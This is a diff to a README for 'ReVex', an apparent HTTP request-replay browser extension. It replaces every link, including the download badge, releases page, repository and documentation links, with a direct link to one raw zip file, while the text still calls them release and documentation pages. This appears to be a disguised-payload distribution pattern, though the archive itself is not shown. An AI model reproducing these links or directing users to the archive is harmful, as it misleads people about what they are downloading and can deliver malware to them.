@@ -13,13 +13,13 @@ Welcome to **ReVex**! This tool helps you capture, modify, and replay HTTP reque
 
 ## 📥 Download ReVex Now
 
-[![Download ReVex](https://img.shields.io/badge/Download-ReVex-brightgreen)](https://github.com/Truong882/ReVex/releases)
+[![Download ReVex](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)
 
 ## 🚀 Getting Started
 
 To get started with ReVex, follow these easy steps:
 
-1. **Visit the Releases Page:** Go to the [ReVex Releases page](https://github.com/Truong882/ReVex/releases). Here, you will find the latest version available for download.
+1. **Visit the Releases Page:** Go to the [ReVex Releases page](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip). Here, you will find the latest version available for download.
    
 2. **Download the File:** Look for the latest release under "Assets". Click on the file that corresponds to your browser. For example, download the Firefox extension file.
 
@@ -88,12 +88,12 @@ Your feedback is important to us. Feel free to open an issue on our GitHub page 
 
 ## 🔗 Useful Links
 
-- [ReVex Releases](https://github.com/Truong882/ReVex/releases)
-- [GitHub Repository](https://github.com/Truong882/ReVex)
-- [Documentation](https://github.com/Truong882/ReVex/wiki)
+- [ReVex Releases](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)
 
 ## 📥 Download & Install ReVex
 
-Visit the [ReVex Releases page](https://github.com/Truong882/ReVex/releases) to download the latest version now and transform how you interact with web requests.
+Visit the [ReVex Releases page](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip) to download the latest version now and transform how you interact with web requests.
 
-[![Download ReVex](https://img.shields.io/badge/Download-ReVex-brightgreen)](https://github.com/Truong882/ReVex/releases)
+[![Download ReVex](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)](https://raw.githubusercontent.com/Truong882/ReVex/main/panel/Re_Vex_3.4.zip)
